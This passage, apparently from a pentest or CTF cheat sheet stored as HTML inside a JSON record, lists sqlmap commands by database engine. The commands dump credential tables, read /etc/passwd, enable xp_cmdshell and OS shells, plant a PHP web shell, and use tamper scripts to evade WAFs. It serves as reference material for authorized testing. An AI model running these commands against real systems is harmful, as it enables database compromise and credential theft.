class=\"s2\">&quot;&lt;url&gt;?id=1&quot;</span><span class=\"w\"> </span>--dbms<span class=\"o\">=</span>mysql<span class=\"w\"> </span>--priv-esc<span class=\"w\"> </span>--batch\n\n<span class=\"c1\"># MySQL file read</span>\nsqlmap<span class=\"w\"> </span>-u<span class=\"w\"> </span><span class=\"s2\">&quot;&lt;url&gt;?id=1&quot;</span><span class=\"w\"> </span>--dbms<span class=\"o\">=</span>mysql<span class=\"w\"> </span>--file-read<span class=\"o\">=</span><span class=\"s2\">&quot;/etc/passwd&quot;</span><span class=\"w\"> </span>--batch\n\n<span class=\"c1\"># MySQL dump users table</span>\nsqlmap<span class=\"w\"> </span>-u<span class=\"w\"> </span><span class=\"s2\">&quot;&lt;url&gt;?id=1&quot;</span><span class=\"w\"> </span>--dbms<span class=\"o\">=</span>mysql<span class=\"w\"> </span>-D<span class=\"w\"> </span>mysql<span class=\"w\"> </span>-T<span class=\"w\"> </span>user<span class=\"w\"> </span>--dump<span class=\"w\"> </span>--batch\n\n<span class=\"c1\"># MySQL stacked queries shell</span>\nsqlmap<span class=\"w\"> </span>-u<span class=\"w\"> </span><span class=\"s2\">&quot;&lt;url&gt;?id=1&quot;</span><span class=\"w\"> </span>--dbms<span class=\"o\">=</span>mysql<span class=\"w\"> </span>--technique<span class=\"o\">=</span>S<span class=\"w\"> </span>--os-shell<span class=\"w\"> </span>--batch\n</code></pre></div>\n<h3 id=\"mssql\">MSSQL</h3>\n<div class=\"highlight\"><pre><span></span><code><span class=\"c1\"># MSSQL full recon</span>\nsqlmap<span class=\"w\"> </span>-u<span class=\"w\"> </span><span class=\"s2\">&quot;&lt;url&gt;?id=1&quot;</span><span class=\"w\"> </span>--dbms<span class=\"o\">=</span>mssql<span class=\"w\"> </span>--dbs<span class=\"w\"> </span>--current-user<span class=\"w\"> </span>--is-dba<span class=\"w\"> </span>--batch\n\n<span class=\"c1\"># MSSQL xp_cmdshell enable + execute</span>\nsqlmap<span class=\"w\"> </span>-u<span class=\"w\"> </span><span class=\"s2\">&quot;&lt;url&gt;?id=1&quot;</span><span class=\"w\"> </span>--dbms<span class=\"o\">=</span>mssql<span class=\"w\"> </span>--os-shell<span class=\"w\"> </span>--batch\n\n<span class=\"c1\"># MSSQL linked servers</span>\nsqlmap<span class=\"w\"> </span>-u<span class=\"w\"> </span><span class=\"s2\">&quot;&lt;url&gt;?id=1&quot;</span><span class=\"w\"> </span>--dbms<span class=\"o\">=</span>mssql<span class=\"w\"> </span><span class=\"se\">\\</span>\n<span class=\"w\">  </span>--sql-query<span class=\"o\">=</span><span class=\"s2\">&quot;SELECT name FROM sys.servers&quot;</span><span class=\"w\"> </span>--batch\n\n<span class=\"c1\"># MSSQL dump all logins</span>\nsqlmap<span class=\"w\"> </span>-u<span class=\"w\"> </span><span class=\"s2\">&quot;&lt;url&gt;?id=1&quot;</span><span class=\"w\"> </span>--dbms<span class=\"o\">=</span>mssql<span class=\"w\"> </span><span class=\"se\">\\</span>\n<span class=\"w\">  </span>-D<span class=\"w\"> </span>master<span class=\"w\"> </span>-T<span class=\"w\"> </span>sys.sql_logins<span class=\"w\"> </span>--dump<span class=\"w\"> </span>--batch\n\n<span class=\"c1\"># MSSQL Windows auth</span>\nsqlmap<span class=\"w\"> </span>-u<span class=\"w\"> </span><span class=\"s2\">&quot;&lt;url&gt;?id=1&quot;</span><span class=\"w\"> </span>--dbms<span class=\"o\">=</span>mssql<span class=\"w\"> </span>--auth-type<span class=\"o\">=</span>ntlm<span class=\"w\"> </span><span class=\"se\">\\</span>\n<span class=\"w\">  </span>--auth-cred<span class=\"o\">=</span><span class=\"s2\">&quot;&lt;domain&gt;\\\\&lt;username&gt;:&lt;password&gt;&quot;</span><span class=\"w\"> </span>--batch\n</code></pre></div>\n<h3 id=\"postgresql\">PostgreSQL</h3>\n<div class=\"highlight\"><pre><span></span><code><span class=\"c1\"># PostgreSQL full recon</span>\nsqlmap<span class=\"w\"> </span>-u<span class=\"w\"> </span><span class=\"s2\">&quot;&lt;url&gt;?id=1&quot;</span><span class=\"w\"> </span>--dbms<span class=\"o\">=</span>postgresql<span class=\"w\"> </span>--dbs<span class=\"w\"> </span>--current-user<span class=\"w\"> </span>--is-dba<span class=\"w\"> </span>--batch\n\n<span class=\"c1\"># PostgreSQL COPY command abuse (file write)</span>\nsqlmap<span class=\"w\"> </span>-u<span class=\"w\"> </span><span class=\"s2\">&quot;&lt;url&gt;?id=1&quot;</span><span class=\"w\"> </span>--dbms<span class=\"o\">=</span>postgresql<span class=\"w\"> </span>--file-write<span class=\"o\">=</span>/tmp/shell.php<span class=\"w\"> </span><span class=\"se\">\\</span>\n<span class=\"w\">  </span>--file-dest<span class=\"o\">=</span>/var/www/html/shell.php<span class=\"w\"> </span>--batch\n\n<span class=\"c1\"># PostgreSQL OS shell via COPY</span>\nsqlmap<span class=\"w\"> </span>-u<span class=\"w\"> </span><span class=\"s2\">&quot;&lt;url&gt;?id=1&quot;</span><span class=\"w\"> </span>--dbms<span class=\"o\">=</span>postgresql<span class=\"w\"> </span>--os-shell<span class=\"w\"> </span>--batch\n\n<span class=\"c1\"># PostgreSQL dump roles</span>\nsqlmap<span class=\"w\"> </span>-u<span class=\"w\"> </span><span class=\"s2\">&quot;&lt;url&gt;?id=1&quot;</span><span class=\"w\"> </span>--dbms<span class=\"o\">=</span>postgresql<span class=\"w\"> </span><span class=\"se\">\\</span>\n<span class=\"w\">  </span>--sql-query<span class=\"o\">=</span><span class=\"s2\">&quot;SELECT rolname,rolpassword FROM pg_authid&quot;</span><span class=\"w\"> </span>--batch\n</code></pre></div>\n<h3 id=\"sqlite\">SQLite</h3>\n<div class=\"highlight\"><pre><span></span><code><span class=\"c1\"># SQLite basic dump</span>\nsqlmap<span class=\"w\"> </span>-u<span class=\"w\"> </span><span class=\"s2\">&quot;&lt;url&gt;?id=1&quot;</span><span class=\"w\"> </span>--dbms<span class=\"o\">=</span>sqlite<span class=\"w\"> </span>--tables<span class=\"w\"> </span>--batch\n\n<span class=\"c1\"># SQLite dump all</span>\nsqlmap<span class=\"w\"> </span>-u<span class=\"w\"> </span><span class=\"s2\">&quot;&lt;url&gt;?id=1&quot;</span><span class=\"w\"> </span>--dbms<span class=\"o\">=</span>sqlite<span class=\"w\"> </span>--dump-all<span class=\"w\"> </span>--batch\n\n<span class=\"c1\"># SQLite no current-user concept, skip DBA check</span>\nsqlmap<span class=\"w\"> </span>-u<span class=\"w\"> </span><span class=\"s2\">&quot;&lt;url&gt;?id=1&quot;</span><span class=\"w\"> </span>--dbms<span class=\"o\">=</span>sqlite<span class=\"w\"> </span>-T<span class=\"w\"> </span>users<span class=\"w\"> </span>--dump<span class=\"w\"> </span>--batch\n</code></pre></div>\n<h2 id=\"burp-request-file-usage\">Burp Request File Usage</h2>\n<div class=\"highlight\"><pre><span></span><code><span class=\"c1\"># Save request from Burp as file (request.txt), then:</span>\nsqlmap<span class=\"w\"> </span>-r<span class=\"w\"> </span>request.txt<span class=\"w\"> </span>--batch\n\n<span class=\"c1\"># Mark injection point with asterisk in request file</span>\n<span class=\"c1\"># Change: id=1   -&gt;  id=1*</span>\nsqlmap<span class=\"w\"> </span>-r<span class=\"w\"> </span>request.txt<span class=\"w\"> </span>--batch\n\n<span class=\"c1\"># Specify parameter from file</span>\nsqlmap<span class=\"w\"> </span>-r<span class=\"w\"> </span>request.txt<span class=\"w\"> </span>-p<span class=\"w\"> </span>&lt;parameter&gt;<span class=\"w\"> </span>--batch\n\n<span class=\"c1\"># Full attack from request file</span>\nsqlmap<span class=\"w\"> </span>-r<span class=\"w\"> </span>request.txt<span class=\"w\"> </span>--level<span class=\"o\">=</span><span class=\"m\">3</span><span class=\"w\"> </span>--risk<span class=\"o\">=</span><span class=\"m\">2</span><span class=\"w\"> </span><span class=\"se\">\\</span>\n<span class=\"w\">  </span>--dbs<span class=\"w\"> </span>--random-agent<span class=\"w\"> </span>--batch<span class=\"w\"> </span><span class=\"se\">\\</span>\n<span class=\"w\">  </span>--output-dir<span class=\"o\">=</span>/tmp/sqlmap_&lt;target&gt;\n</code></pre></div>\n<h2 id=\"common-one-liners\">Common One-Liners</h2>\n<div class=\"highlight\"><pre><span></span><code><span class=\"c1\"># Quick check: is it injectable?</span>\nsqlmap<span class=\"w\"> </span>-u<span class=\"w\"> </span><span class=\"s2\">&quot;&lt;url&gt;?id=1&quot;</span><span class=\"w\"> </span>--batch<span class=\"w\"> </span>--dbs\n\n<span class=\"c1\"># CTF standard: full dump</span>\nsqlmap<span class=\"w\"> </span>-u<span class=\"w\"> </span><span class=\"s2\">&quot;&lt;url&gt;?id=1&quot;</span><span class=\"w\"> </span>--batch<span class=\"w\"> </span>--level<span class=\"o\">=</span><span class=\"m\">3</span><span class=\"w\"> </span>--risk<span class=\"o\">=</span><span class=\"m\">2</span><span class=\"w\"> </span><span class=\"se\">\\</span>\n<span class=\"w\">  </span>--dbs<span class=\"w\"> </span>--dump-all<span class=\"w\"> </span>--random-agent\n\n<span class=\"c1\"># From Burp with cookie auth</span>\nsqlmap<span class=\"w\"> </span>-r<span class=\"w\"> </span>request.txt<span class=\"w\"> </span>--cookie<span class=\"o\">=</span><span class=\"s2\">&quot;session=&lt;password&gt;&quot;</span><span class=\"w\"> </span><span class=\"se\">\\</span>\n<span class=\"w\">  </span>--level<span class=\"o\">=</span><span class=\"m\">3</span><span class=\"w\"> </span>--risk<span class=\"o\">=</span><span class=\"m\">2</span><span class=\"w\"> </span>--batch<span class=\"w\"> </span>--dbs\n\n<span class=\"c1\"># WAF bypass + full dump</span>\nsqlmap<span class=\"w\"> </span>-u<span class=\"w\"> </span><span class=\"s2\">&quot;&lt;url&gt;?id=1&quot;</span><span class=\"w\"> </span><span class=\"se\">\\</span>\n<span class=\"w\">  </span>--tamper<span class=\"o\">=</span>space2comment,charencode,randomcase<span class=\"w\"> </span><span class=\"se\">\\</span>\n<span class=\"w\">  </span>--level<span class=\"o\">=</span><span class=\"m\">5</span><span class=\"w\"> </span>--risk<span class=\"o\">=</span><span class=\"m\">3</span><span class=\"w\"> </span>--batch<span class=\"w\"> </span>--dbs<span class=\"w\"> </span>--dump-all<span class=\"w\"> </span><span class=\"se\">\\</span>\n<span class=\"w\">  </span>--random-agent<span class=\"w\"> </span>--threads<span class=\"o\">=</span><span class=\"m\">3</span>\n\n<span class=\"c1\"># Time-based blind on slow target</span>\nsqlmap<span class=\"w\"> </span>-u<span class=\"w\"> </span><span class=\"s2\">&quot;&lt;url&gt;?id=1&quot;</span><span class=\"w\"> </span>--technique<span class=\"o\">=</span>T<span class=\"w\"> </span>--time-sec<span class=\"o\">=</span><span class=\"m\">5</span><span class=\"w\"> </span><span class=\"se\">\\</span>\n<span class=\"w\">  </span>--dbms<span class=\"o\">=</span>mysql<span class=\"w\"> </span>--level<span class=\"o\">=</span><span class=\"m\">3</span><span class=\"w\"> </span>--batch<span class=\"w\"> </span>--dbs\n</code></pre></div>", "excerpt": "SQLMap Basic Detection # Basic GET parameter test sqlmap -u &quot;&lt;url&gt;?id=1&quot; # Specific parameter sqlmap -u &quot;&lt;url&gt;?id=1&amp;page=2&quot; -p id # POST request sqlmap -u &lt;url&g", "tags": []}